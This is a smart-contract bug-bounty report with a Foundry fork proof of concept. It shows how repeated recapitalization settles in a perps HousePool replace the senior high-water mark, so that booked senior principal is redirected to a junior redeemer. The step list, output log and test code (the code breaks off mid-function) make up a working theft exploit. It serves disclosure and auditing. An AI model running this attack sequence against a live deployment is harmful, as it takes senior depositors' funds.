# \#98667 [SC-High] Booked senior principal is paid to junior when the recap mark is replaced

**Submitted on Nov 9th 2026 at 11:36:57 UTC by @Omisanin0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98667
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An empty senior book is supposed to take a recapitalization once. The first settle books the cash as senior principal and sets the high-water mark to the whole queued recap. That mark is the recovery target the waterfall tests keep. The next settle reserves the residual recap against the same cash. The reserve eats the distributable balance, `absorbLoss` zeros the senior principal, and the empty-book branch runs again. It writes the mark down to the residual recap. One settle later the last recap slice and the queued revenue are reserved together. The mark is replaced again, down to that last slice, so the gap above senior principal is gone. The revenue is credited to junior, and the junior redeem in that epoch is paid from the cash. On this fork the senior principal booked at 340,000.385469 USDG falls by 220,000.156407 USDG. Bob, whose junior shares were worth nothing after the wipe, is paid 73,382.034131 USDG. The rest of the drop stays as junior principal. Alice's share of the booked senior was 226,593.732378 USDG. Her later redeem pays 79,975.781200 USDG.

## Vulnerability Details

`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` is the empty-book branch. It runs only when senior supply is nonzero and both stored principals are zero (lines 117-122). It sets senior principal to the settleable recap amount and the high-water mark to `max(full outstanding recap, that amount)`. Recap never goes to junior in this function. The waterfall test expects the first use of that branch: senior principal equals the settleable slice, and the mark stays on the gross recap so the residual can restore senior later (`HousePoolWaterfall.t.sol` line 201).

`HousePool._reconcile` (line 1555) does not apply the pending buckets to the stored principals. It plans the waterfall first. `_settleablePendingClaimantBuckets` (line 1829) caps the buckets to distributable assets, recap first. `HousePoolReconcilePlanLib.planReconcile` (lines 68-71) then subtracts that settleable total from distributable before it compares what is left with claimed principal. When the reserved pending is the whole cash balance, the waterfall sees a loss equal to the stored senior principal. `absorbLoss` (lines 167-184) zeros junior, then senior, and leaves the high-water mark where it was. The comment on that function says the mark is kept so later revenue can restore the impairment.

`_reconcile` writes that zeroed waterfall (line 1584) and then calls `_applyPendingClaimantBucketsLive` (line 1759). That function reads the waterfall it just wrote. Both principals are now zero, senior shares are still outstanding, and the empty-book branch runs on a book that had senior principal at the start of the call. The mark argument is the full outstanding recap, not the gross amount from the first settle. The branch overwrites the mark with `max(residual recap, settleable slice)`.

The third settle is the one that pays. `allowRevenueContinuation` is sampled at line 1567, while senior principal is still nonzero, and line 1577 keeps it true after `absorbLoss` has zeroed the plan. Revenue is therefore allowed into the waterfall the empty-book branch just re-seeded. On this run the new mark equals the new senior principal, so the restoration gap is zero. `applyRevenueIntent` (lines 180-182) adds the revenue to junior principal. `_settleLpEpoch` has already reconciled (line 835). The junior phase prices the matured redeem on that principal, `safeTransfer`s the settlement token into the vault (line 1007), and line 886 subtracts the funded amount from junior principal.

`payOut` (lines 604-613) decreases `accountedAssets` and transfers. It does not touch either pending bucket. A winning close can remove cash while a queued recap and a queued revenue balance stay at the old amounts. `recordClaimantInflow` always queues recap (line 644). It queues revenue only when both stored principals are already zero (lines 646-648). `CfdEngineSettlementSidecar._executeClose` sends a losing trader's pledge in through that function (lines 604-612). `recapitalizePool` (lines 632-652) transfers the owner's tokens into the pool and queues the same amount. It does not set the mark.

The cash has to sit in a band or the second replace never lines up with a junior credit. Let `R` be the queued recap and `C` the pool cash, with both principals still zero and the book flat.

1. The first settle is the documented bootstrap. Settleable recap is `C`, because recap is capped to distributable and takes priority over revenue. Senior principal becomes `C`. The mark becomes `R`. Pending recap left is `R - C`. Bob is paid nothing, because junior principal is still zero and the vault refunds the shares.
2. The second settle reserves `min(R - C, C)`. That equals `C` when `R > 2C`. The waterfall loss is the senior principal just booked. `absorbLoss` zeros it and keeps the mark at `R`. The empty-book branch then books senior principal `C` again and replaces the mark with `R - C`. Pending recap left is `R - 2C`. Bob is paid nothing again.
3. The third settle reserves the last recap slice `R - 2C` and then revenue, up to the same cash cap. The revenue slice is `C - (R - 2C) = 3C - R`, provided `R < 3C` and the queued revenue is at least that large. Reserving both spends the whole distributable balance, so `absorbLoss` zeros senior principal once more. The empty-book branch books senior principal at `R - 2C` and sets the mark to the same number. The revenue has no gap left to fill and is credited to junior. The drop in senior principal is `C - (R - 2C) = 3C - R`.

A few atoms of senior principal left after `absorbLoss` skip the branch. The revenue requirement is what drives the loss all the way to zero. The test checks the band directly: residual recap greater than cash, recap under three times cash, and revenue large enough to fill `3C - R`.

This run uses `R = 800,001` USDG and `C = 340,000.385469` USDG. `3C - R = 220,000.156407` USDG. The printed window is `(266,667.000001, 400,000.499999)`, which is `(R/3, R/2)` in atoms. After the second settle the stored senior principal is still `C` and the mark is `460,000.614531`, the residual recap. `TrancheVault.convertToAssets` reads `getPendingTrancheState` (HousePool line 1295), so it already shows the third settle: Alice 79,974.320476, Bob 73,382.034131. Neither wallet has been paid. The third settle commits that preview. Bob receives 73,382.034131. Junior principal left in the same settle is 146,618.122276. Those two add to the senior drop.

The path into that band is ordinary pool flow. Alice and Bob deposit through `requestDeposit`, `settleLpEpoch`, and `claimDeposit`. Short closes then pay the cash out through the engine. A short opened while the pool is large stores a max profit that a later fresh open cannot reach: the launch skew cap is `0.4e18`, the helper stops a new short at 39% of depth, the minimum notional is 1,000 USDG, and `_maxAdditionalProfit` leaves the configured settlement buffer (launch value 25 bps). An 80 lot long, opened beside the 400 lot sweeper, has a smaller max profit than the short, so it does not raise the larger-side liability. After the fresh drains stop, the sweeper is closed at the cap for its stored max profit and the long is closed down to the last atom of cash. Claims stay zero. The cash leaves through `HousePool.payOut`, which the engine calls on the close.

The close that spends the last cash latches degraded mode while that long is still open for the last lot. Once the lot is gone, both side max profits are zero and pool cash is zero. `CfdEngine.clearDegradedMode` (lines 658-666) is the owner's recovery for that state: it requires cash, net of trader claims, to cover the larger side's max profit, and here both sides are zero. `HousePool._requireWithdrawalsLive` (line 1867) reverts `HousePool__DegradedMode` until that call. The three settles that move the senior cash are Bob's redeems. They go through `pool.settleLpEpoch` as the deployed router. The owner calls are the recap queue and the flat-book clear. Neither call takes a mark.

Bob's redeem on the empty book is refunded. `absorbLoss` zeros both principals and leaves the high-water mark. Alice's senior shares stay, and `convertToAssets` on them is zero. The owner then calls `recapitalizePool(800_001e6)`. Principals are still zero, so the 2,800 lot losing long, filled at one quarter of the cap and closed at the cap, queues its loss as revenue. Winning shorts shave the cash into the band. The pending buckets are unchanged by those payouts.

F-580 is the first apply. It treats the gross mark of 800,001 as the bug. The waterfall test at line 201 says that mark is the recovery target, and revenue after it restores senior up to the mark before junior is credited. The payment here is the second apply and the third. They replace that mark. With the mark pulled down to the senior principal the third settle just wrote, the queued revenue is junior principal, and the redeem transfers it out of the cash the previous settle had booked to senior.

## Impact Details

Impact: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield. Critical.

The senior principal was booked, and the shares were still outstanding. The paying settle reduces that principal and credits junior. Bob's shares are burned for USDG. The junior principal left in the same settle belongs to the junior shares that remain.

Settlement token is the deployment's USDG, 6 decimals. The protocol prices 1 USDG at $1, so the figures below are the dollar amounts of this fork. Perps is not on mainnet. This is the measured loss for this recap and this cash level.

| Account | Before the paying settle (USDG) | After that settle (USDG) |
|---|---:|---:|
| Senior principal | 340,000.385469 | 120,000.229062 |
| Junior principal | 0 | 146,618.122276 |
| Bob wallet | 0 | 73,382.034131 |

Bob's wallet plus the junior principal left is 220,000.156407. The senior drop is 220,000.156407. The test requires those two integers to be equal. Senior principal of 120,000.229062 is still on the books after the settle.

Alice's shares times the senior principal from the second settle, divided by senior supply, is 226,593.732378. That is her claim on the booked cash. Her redeem, after the owner's later junior exit, pays 79,975.781200. The test requires that payout to be more than 1,000 USDG under the booked share.

The owner's later junior redeem pays 116,616.695145. The vault's seed floor is why the requested shares and the claimable shares differ: 1,000,008.000056000 requested, 795,390.191563960 claimable. That redeem, and Alice's, settle the revenue still pending after the theft (200,475.153302). The books move again. `juniorPrincipalLeft` in the final log line is that later balance, 10,006.659914. The equality uses 146,618.122276, the junior principal still stored when the third settle returned.

Bob's junior shares were refunded on the wipe, so the shares that receive the credit were not bought at a positive NAV. The drain, the losing long, and the shave are engine fills. Their margin is the token's own mint on this testnet deployment. The closes in the log leave the trader wallet unchanged because the payout sits in the clearinghouse. The USDG that leaves the pool for Bob is the 73,382.034131 on the third settle.

The same band scales with the queued recap. Any cash strictly between `R/3` and `R/2`, with queued revenue of at least `3C - R`, gives up `3C - R` of already booked senior principal on the third settle. This demonstration is 220,000.156407 USDG, about $220,000.16.

## References

- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`: `applyClaimantRecapitalizationIntent` (line 111), empty-book write (lines 117-122). `applyRevenueIntent` (line 158) credits junior at lines 180-182. `capClaimantBuckets` (line 72) gives recap priority over revenue.
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol`: `planReconcile` (line 47) subtracts settleable pending at lines 68-71, then `absorbLoss` at lines 102-104.
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol`: `absorbLoss` (line 167) zeros principal and does not write the high-water mark. `planReconcile` (line 98).
- `packages/perps/src/HousePool.sol`: `_reconcile` (line 1555), `allowRevenueContinuation` (lines 1567 and 1577), `_applyPendingClaimantBucketsLive` (line 1759), `_settleablePendingClaimantBuckets` (line 1829), `_settleLpEpoch` (line 824) reconciles at line 835, junior funding subtracts principal at line 886, `safeTransfer` at line 1007, `payOut` (line 604), `recordClaimantInflow` (line 624), `getPendingTrancheState` (line 1295), degraded-mode revert (line 1867).
- `packages/perps/src/CfdEngine.sol`: `recapitalizePool` (line 632), `clearDegradedMode` (line 658), `_payOrRecordTraderClaim` (line 840), `_availableCashForFreshPoolPayouts` (line 865).
- `packages/perps/src/CfdEngineSettlementSidecar.sol`: `_executeClose` records revenue at lines 604-612 and records the trader payout at line 618.
- `packages/perps/src/TrancheVault.sol`: `convertToAssets` (line 521) prices off `getPendingTrancheState`.
- `packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol` line 201. The gross recap mark is the recovery target of the first empty-book apply.
- `packages/perps/DEPLOYMENT.md`. Launch `maxSkewRatio` `0.4e18`, `settlementBufferBps` 25, `executionFeeBps` 4.
- Source pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

## Proof of Concept

## Proof of Concept

The in-scope deployment is Arbitrum Sepolia v2.0.0. The test forks that chain at block 324500000 and talks to the contracts already there. It deploys nothing. Chain id is 421614. HousePool `0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e` must have codehash `0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957` or the test stops. Junior vault `0x4A8b67184a1E3224c11A191cc69F22C50EEf734e`. Senior vault `0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d`. Engine `0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA`. Clearinghouse `0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A`. Settlement token `0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D`.

No in-scope contract is mocked. The test does not call `vm.etch`, `vm.mockCall`, `vm.deal`, or `vm.store`. There is no Pyth mock. `mint` is that token's own public mint. It funds the two deposits, the trader margin, and the owner recap. It is not called on the payment. Opens and closes call `processOrderTyped` as the deployed router, with `pool.totalAssets()` as the depth argument. Marks call `updateMarkPrice` as that same router. A rejected open or close is reverted with the snapshot. The call that is kept is not reverted. The price on the way in is one quarter of the cap. The prices on the way out are the closes the search accepts. `clearDegradedMode` runs only after cash is zero and both side max profits are zero. The impact asserts run on the third settle, before the later owner and Alice redeems. USDG `totalSupply` does not change across the three settles.

Run from the Foundry project at `audit-comp-plether/packages/perps/foundry.toml` (solc 0.8.35, via IR, optimizer runs 200). Forge from the repo root compiles nothing. Foundry is the only dependency. No API key, no private key, no `--ffi`. If `ARB_SEPOLIA_RPC_URL` is unset, the test uses `https://arbitrum-sepolia.gateway.tenderly.co`.

```bash
cd audit-comp-plether/packages/perps
forge test --match-contract F534EmptyBookRecapFork --threads 1 -vv
```

One run of that command passed. Exit status 0. Suite result: 1 passed, 0 failed. Gas 17,869,418. Finished in 576.56ms on a warm cache. The test asserts chain id 421614 and the HousePool codehash above. The log prints `forkChainId 421614` and `forkBlock 324500000`.

Steps:

1. Fork Arbitrum Sepolia at block 324500000. Warp to timestamp 1793572200, Sunday 2026-11-01 22:30:00 UTC, after the 17:00 New York open, so the oracle is not frozen. Refresh the stored mark. Long and short open interest are both 0. The pool already holds the seed: cash 2,000,002.000000, senior principal 1,000,001.000017, junior principal 1,000,000.999983.
2. Alice deposits 2,000,000 USDG into senior. Request 498215, shares 1,998,031.868256533. Bob deposits 500,000 USDG into junior. Request 498216, shares 500,502.212373974. Each deposit is `requestDeposit`, then `settleLpEpoch`, then `claimDeposit`. Pool cash is 4,500,002.000000. Senior principal is 3,000,996.425866. Junior principal is 1,499,005.574134. Alice's `convertToAssets` is 2,000,018.264839. Bob's is 499,999.999999.
3. Open a 400 lot short for the sweeper at one quarter of the cap. Stored max profit is 60,000. Open an 80 lot long for the finisher. Stored max profit is 4,000. Two fresh short drains then pay the pool down: 29,525 lots, cash 73,614.284444, then 89 lots, cash 60,271.404444. The next pass has room for 0 lots. Close the sweeper at the cap. Cash left 302.960000, claims 0. Partial-close 79 lots of the long at price 46,289,062. Cash left 11.416632. Close the last lot at price 38,574,218. Cash 0, claims 0. `degradedOnFlatBook` is true. Both side max profits are 0. `engine.owner()` calls `clearDegradedMode`. The latch clears.
4. Bob redeems the junior shares. The vault refunds all 500,502.212373974 shares. `absorbLoss` zeros both principals. Alice's senior share balance is unchanged. Her `convertToAssets` is 0. The high-water mark left behind is 3,001,051.238586.
5. The engine owner calls `recapitalizePool` with 800,001 USDG. Pending recap is 800,001. Both principals stay 0. A 2,800 lot long, same entry, closes at the cap and queues 420,122.499846 of revenue. Cash is 1,220,123.499846. Four winning short closes shave cash to 340,000.385469. Pending recap is still 800,001. Pending revenue is 420,475.309709, the loss plus the open and close fees that also queued. The window is 266,667.000001 to 400,000.499999. Principals are still 0. Alice's preview, which already includes the pending buckets, reads 226,593.732378. Bob's preview is 0.
6. Bob requests a full junior redeem. The first settle refunds the shares. Senior principal becomes 340,000.385469. The mark becomes 800,001. Pending recap left is 460,000.614531. Junior principal is 0. Bob is paid 0. Cash does not move.
7. Bob requests again. The second settle refunds the shares. Senior principal stays 340,000.385469. The mark is replaced with 460,000.614531. Pending recap left is 120,000.229062. Bob is paid 0. Cash does not move. `convertToAssets` now prices Alice at 79,974.320476 and Bob at 73,382.034131. Both wallets are still 0.
8. Bob requests a third time. The settle pays 73,382.034131 into his wallet. Senior principal falls to 120,000.229062. Junior principal left in that settle is 146,618.122276. The mark is 120,000.229062. Pending recap is 0. Pending revenue left is 200,475.153302. Cash falls by Bob's payment, from 340,000.385469 to 266,618.351338. Before any later redeem, the test checks that this wallet gain equals the pool cash drop, that the wallet gain plus the junior principal left equals the senior drop of 220,000.156407, and that USDG `totalSupply` is unchanged.
9. `pool.owner()` (`0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B`) then redeems junior and is paid 116,616.695145. Alice redeems senior and is paid 79,975.781200. Those two redeems are after the snapshot. The equality does not include them.

The lines below are the snapshots and the checks. The command also prints each open, each close, and the drain passes.

```text
forkChainId 421614
forkBlock 324500000
housePool 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e
pin
  cash 2000002000000
  seniorP 1000001000017
  juniorP 1000000999983
  hwm 1000001000017
longOi 0
shortOi 0
depositAccount 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
depositAssets 2000000000000
depositRequest 498215
depositShares 1998031868256533
depositAccount 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e
depositAssets 500000000000
depositRequest 498216
depositShares 500502212373974
deposited
  cash 4500002000000
  seniorP 3000996425866
  juniorP 1499005574134
  aliceAssets 2000018264839
  bobAssets 499999999999
sweeperLots 400
sweeperMaxProfit 60000000000
finisherLots 80
finisherMaxProfit 4000000000
drainPass 0
drainCash 4500002284444
drainLots 29525
drainPass 1
drainCash 73614284444
drainLots 89
drainPass 2
drainCash 60271404444
drainLots 0
sweeperClosePayout 60000000000
cashAfterSweeperMax 302960000
claimsAfterSweeperMax 0
partialExit 46289062
cashAfterPartial 11416632
finalExit 38574218
cashAfterExactClose 0
claimsAfterExactClose 0
degradedOnFlatBook true
longMaxOnFlatBook 0
shortMaxOnFlatBook 0
wiped
  cash 0
  seniorP 0
  juniorP 0
  hwm 3001051238586
  aliceAssets 0
bobRefundOnWipe 0
recapQueued 800001000000
queuedRevenue 420122499846
cashAfterShave 340000385469
armed
  cash 340000385469
  seniorP 0
  juniorP 0
  hwm 3001051238586
  pendRecap 800001000000
  pendRev 420475309709
  aliceAssets 226593732378
  bobAssets 0
windowLow 266667000001
windowHigh 400000499999
settle1
  cash 340000385469
  seniorP 340000385469
  juniorP 0
  hwm 800001000000
  pendRecap 460000614531
  pendRev 420475309709
bobPaidThisSettle 0
settle2
  cash 340000385469
  seniorP 340000385469
  juniorP 0
  hwm 460000614531
  pendRecap 120000229062
  pendRev 420475309709
  aliceAssets 79974320476
  bobAssets 73382034131
bobPaidThisSettle 0
settle3
  cash 266618351338
  seniorP 120000229062
  juniorP 146618122276
  hwm 120000229062
  pendRecap 0
  pendRev 200475153302
  bobUsdg 73382034131
bobPaidThisSettle 73382034131
IMPACT seniorPrincipalBefore 340000385469
IMPACT seniorPrincipalAfter 120000229062
IMPACT seniorPrincipalDrop 220000156407
IMPACT bobWalletBefore 0
IMPACT bobWalletAfter 73382034131
IMPACT bobWalletGain 73382034131
IMPACT juniorPrincipalLeft 146618122276
IMPACT juniorReceived 220000156407
IMPACT poolCashBefore 340000385469
IMPACT poolCashAfter 266618351338
IMPACT poolCashDrop 73382034131
IMPACT tokenSupplyBeforeSettles 11316731409009
IMPACT tokenSupplyAfterSettles 11316731409009
fundsAtRiskUsdg 220000
juniorReceivedAtTheft 220000156407
seniorPrincipalDrop 220000156407
redeemAccount 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B
redeemShares 1000008000056000
claimableShares 795390191563960
redeemedAssets 116616695145
redeemAccount 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
redeemShares 1998031868256533
redeemedAssets 79975781200
bobPaid 73382034131
ownerJuniorPaid 116616695145
alicePaid 79975781200
aliceAssetsAfterTheft 79974320476
aliceShareOfBookedSenior 226593732378
juniorPrincipalLeft 10006659914
poolCashLeft 50033299570
tokenSupplyIncrease 9316729409009
```

The `IMPACT` lines are printed before the owner and Alice redeems. `IMPACT juniorReceived` equals `IMPACT seniorPrincipalDrop`. `IMPACT poolCashDrop` equals `IMPACT bobWalletGain`. `IMPACT tokenSupplyBeforeSettles` equals `IMPACT tokenSupplyAfterSettles`. The later `juniorPrincipalLeft` is the balance after those redeems.

Full test, `audit-comp-plether/packages/perps/test/perps/fork/F534EmptyBookRecapFork.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";

/// @notice Fork PoC for the empty-book recap overwrite. Local Anvil fork only. Do not broadcast.
/// @dev Run from `packages/perps` with that directory's foundry.toml
///      (solc 0.8.35, via_ir, optimizer runs 200):
///
///        forge test --match-contract F534EmptyBookRecapFork --threads 1 -vv
///
///      Optional env: ARB_SEPOLIA_RPC_URL. If unset, the test forks
///      https://arbitrum-sepolia.gateway.tenderly.co at block 324500000.
///      The file forks the deployed HousePool, vaults, engine, clearinghouse, router, and USDG.
///      It does not deploy over those addresses and does not call vm.etch, vm.mockCall, vm.deal,
///      or vm.store. There is no Pyth mock. `mint` is the deployed token's own mint. It funds
///      deposits, the owner recap, and trader margin. It is not called on the payment below.
///      Opens, closes, and marks are `processOrderTyped` and `updateMarkPrice` as
///      `engine.orderRouter()`, with `pool.totalAssets()` as the depth. A rejected open or close
///      is reverted with the snapshot. The call that is kept is not reverted.
///      The impact is checked on the third settle, before the later owner and Alice redeems.
///      Senior principal drop equals Bob's wallet gain plus the junior principal left in that
///      settle. Pool USDG falls by the same wallet gain. USDG totalSupply does not change
///      across the three settles.
contract F534EmptyBookRecapForkTest is Test {

    uint256 constant FORK_BLOCK = 324_500_000;
    /// @dev Sunday 2026-11-01 22:30:00 UTC, after the 17:00 New York FX open (standard time).
    uint256 constant LIVE_TS = 1_793_572_200;
    uint256 constant ALICE_SENIOR = 2_000_000e6;
    uint256 constant BOB_JUNIOR = 500_000e6;
    uint256 constant RECAP = 800_001e6;
    uint256 constant MIN_NOTIONAL = 1_000e6;
    address constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address constant SENIOR = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address constant TOKEN = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    bytes32 constant POOL_CODEHASH = 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957;

    IUsdG internal token;
    IPool internal pool;
    IVault internal junior;
    IVault internal senior;
    IEngine internal engine;

    address internal owner;
    address internal router;
    address internal alice;
    address internal bob;
    address internal drainer;
    address internal sweeper;
    address internal finisher;
    address internal loser;
    address internal winner;

    function setUp() public {
        string memory rpc = vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        assertEq(block.chainid, 421_614, "fork must be Arbitrum Sepolia");
        assertEq(POOL.codehash, POOL_CODEHASH, "fork is not the v2.0.0 HousePool");

        token = IUsdG(TOKEN);
        pool = IPool(POOL);
        junior = IVault(JUNIOR);
        senior = IVault(SENIOR);
        engine = IEngine(ENGINE);
        owner = pool.owner();
        router = engine.orderRouter();
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        drainer = makeAddr("drainer");
        sweeper = makeAddr("sweeper");
        finisher = makeAddr("finisher");
        loser = makeAddr("loser");
        winner = makeAddr("winner");
    }

    function test_Fork_EmptyBookReplacePaysSeniorPrincipalToJunior() public {
        uint256 supplyBefore = token.totalSupply();
        console2.log("forkChainId", block.chainid);
        // createSelectFork pins the L2 block. On this chain block.number is the L1 block.
        console2.log("forkBlock", FORK_BLOCK);
        console2.log("housePool", POOL);
        _warpUntilOracleLive();
        _refreshMark(engine.lastMarkPrice());
        _log("pin");
        (uint256 longOi,,,) = engine.sides(0);
        (uint256 shortOi,,,) = engine.sides(1);
        console2.log("longOi", longOi);
        console2.log("shortOi", shortOi);
        require(longOi == 0 && shortOi == 0, "fork book is not flat");

        // Step 1. Real senior and junior deposits. Alice is the senior victim. Bob holds
        // junior shares that are worth nothing after the wipe and later receive the cash.
        _deposit(senior, alice, ALICE_SENIOR);
        _deposit(junior, bob, BOB_JUNIOR);
        _log("deposited");
        uint256 aliceShares = senior.balanceOf(alice);
        uint256 bobShares = junior.balanceOf(bob);
        require(aliceShares > 0 && bobShares > 0, "deposits minted no shares");

        // Step 2. Real short closes pay the pool cash out. A sweeper short is opened while the
        // pool is large enough to store its max profit, then closed after the geometric drains
        // for the tail a new open can no longer take. The flat settle then absorbs the loss
        // and both stored principals become 0. Shares stay.
        uint256 entry = _lowEntry();
        _refreshMark(entry);
        _drainToZero(entry);
        _log("drained");
        require(token.balanceOf(POOL) == 0, "drain left pool cash");
        require(engine.totalTraderClaimBalanceAssets() == 0, "drain left a trader claim");
        uint256 bobRefund = _redeemAndCollect(junior, bob);
        _log("wiped");
        console2.log("bobRefundOnWipe", bobRefund);
        require(pool.seniorPrincipal() == 0 && pool.juniorPrincipal() == 0, "wipe did not zero both principals");
        require(senior.balanceOf(alice) == aliceShares, "wipe burned alice");
        require(junior.balanceOf(bob) > 0, "wipe burned bob");
        require(senior.convertToAssets(aliceShares) == 0, "alice still has senior assets after the wipe");

        // Step 3. While both principals stay 0, the owner recap only queues. A losing long
        // close then queues revenue through the settlement sidecar. A winning short close
        // pays most of that cash out. payOut does not shrink either pending bucket.
        _mintAndRecap(RECAP);
        require(pool.pendingRecapitalizationAssets() == RECAP, "recap was not queued");
        require(pool.seniorPrincipal() == 0 && pool.juniorPrincipal() == 0, "recap reconciled");
        _queueRevenue(entry, 420_000e6);
        // Land inside (recap/3, recap/2). The top edge is one atom wide, so aim lower.
        _shaveCashTo(entry, 340_000e6);
        _log("armed");
        uint256 armedCash = token.balanceOf(POOL);
        uint256 armedRecap = pool.pendingRecapitalizationAssets();
        uint256 armedRev = pool.pendingTradingRevenueAssets();
        console2.log("windowLow", armedRecap / 3 + 1);
        console2.log("windowHigh", (armedRecap - 1) / 2);
        require(pool.seniorPrincipal() == 0 && pool.juniorPrincipal() == 0, "arming reconciled");
        require(armedCash > 100_000e6, "armed cash is not material");
        require(armedRecap > 2 * armedCash, "residual recap cannot overwrite the mark");
        require(armedRecap < 3 * armedCash, "revenue does not fit on the third settle");
        require(armedRev + armedRecap - 2 * armedCash >= armedCash, "revenue cannot fill the third settle");

        // Step 4. Three Bob redeems on the flat book. settleLpEpoch does not require the
        // router once no position is open. The first settle books the cash as senior
        // principal and keeps the gross recap mark. The second reserves the residual recap,
        // wipes that principal, and replaces the mark. The third reserves the last recap
        // slice plus the queued revenue, replaces the mark again, and credits junior.
        // The impact asserts run here, before any later redeem.
        uint256 cashBeforeSettles = token.balanceOf(POOL);
        uint256 supplyBeforeSettles = token.totalSupply();
        uint256 bobBeforeSettles = token.balanceOf(bob);
        uint256 hwmAfterFirst;
        uint256 seniorAfterFirst;
        uint256 hwmAfterSecond;
        uint256 seniorAfterSecond;
        uint256 juniorAtTheft;
        uint256 bobPaid;
        for (uint256 pass; pass < 4; ++pass) {
            uint256 paid = _redeemAndCollect(junior, bob);
            _log(pass == 0 ? "settle1" : pass == 1 ? "settle2" : pass == 2 ? "settle3" : "settle4");
            console2.log("bobPaidThisSettle", paid);
            bobPaid += paid;
            if (pass == 0) {
                hwmAfterFirst = pool.seniorHighWaterMark();
                seniorAfterFirst = pool.seniorPrincipal();
                require(seniorAfterFirst == armedCash, "first settle did not book the cash as senior");
                require(hwmAfterFirst == armedRecap, "first settle did not keep the gross recap mark");
                require(pool.juniorPrincipal() == 0, "first settle credited junior");
                require(paid == 0, "first settle paid bob");
            } else if (pass == 1) {
                hwmAfterSecond = pool.seniorHighWaterMark();
                seniorAfterSecond = pool.seniorPrincipal();
                require(seniorAfterSecond == armedCash, "second settle moved the senior cash");
                require(hwmAfterSecond < hwmAfterFirst, "second settle did not replace the mark");
                require(paid == 0, "second settle paid bob");
            } else if (pass == 2) {
                require(pool.seniorHighWaterMark() < hwmAfterSecond, "third settle did not replace the mark");
                require(pool.seniorPrincipal() < seniorAfterSecond, "third settle kept senior principal");
                require(paid > 50_000e6, "third settle did not pay bob");
                juniorAtTheft = pool.juniorPrincipal();
                break;
            }
        }

        _proveImpact(
            cashBeforeSettles, supplyBeforeSettles, bobBeforeSettles, seniorAfterSecond, hwmAfterFirst, juniorAtTheft, bobPaid
        );
        _showAliceShortfall(aliceShares, seniorAfterSecond, bobPaid, supplyBefore);
    }

    /// @dev Impact of the third settle only. Reads the deployed pool and token. No mint, no storage write.
    function _proveImpact(
        uint256 cashBeforeSettles,
        uint256 supplyBeforeSettles,
        uint256 bobBeforeSettles,
        uint256 seniorBeforeTheft,
        uint256 grossMark,
        uint256 juniorAtTheft,
        uint256 bobPaid
    ) internal view {
        uint256 seniorAfterTheft = pool.seniorPrincipal();
        uint256 cashAfterTheft = token.balanceOf(POOL);
        uint256 bobAfterTheft = token.balanceOf(bob);
        uint256 seniorDrop = seniorBeforeTheft - seniorAfterTheft;
        uint256 bobGain = bobAfterTheft - bobBeforeSettles;
        uint256 poolCashDrop = cashBeforeSettles - cashAfterTheft;
        uint256 juniorReceived = bobPaid + juniorAtTheft;
        console2.log("IMPACT seniorPrincipalBefore", seniorBeforeTheft);
        console2.log("IMPACT seniorPrincipalAfter", seniorAfterTheft);
        console2.log("IMPACT seniorPrincipalDrop", seniorDrop);
        console2.log("IMPACT bobWalletBefore", bobBeforeSettles);
        console2.log("IMPACT bobWalletAfter", bobAfterTheft);
        console2.log("IMPACT bobWalletGain", bobGain);
        console2.log("IMPACT juniorPrincipalLeft", juniorAtTheft);
        console2.log("IMPACT juniorReceived", juniorReceived);
        console2.log("IMPACT poolCashBefore", cashBeforeSettles);
        console2.log("IMPACT poolCashAfter", cashAfterTheft);
        console2.log("IMPACT poolCashDrop", poolCashDrop);
        console2.log("IMPACT tokenSupplyBeforeSettles", supplyBeforeSettles);
        console2.log("IMPACT tokenSupplyAfterSettles", token.totalSupply());
        console2.log("fundsAtRiskUsdg", seniorDrop / 1e6);
        assertEq(juniorAtTheft, pool.juniorPrincipal(), "junior principal moved before the check");
        assertEq(bobGain, bobPaid, "bob wallet gain is not the third settle");
        assertEq(bobAfterTheft, bobPaid, "bob balance is not the redeem");
        assertEq(poolCashDrop, bobPaid, "pool cash drop is not bob's payment");
        assertEq(juniorReceived, seniorDrop, "junior did not receive the senior principal");
        assertEq(token.totalSupply(), supplyBeforeSettles, "the three settles minted USDG");
        assertGt(seniorDrop, 100_000e6, "senior principal did not drop");
        assertGt(bobPaid, 50_000e6, "bob was not paid from the booked senior cash");
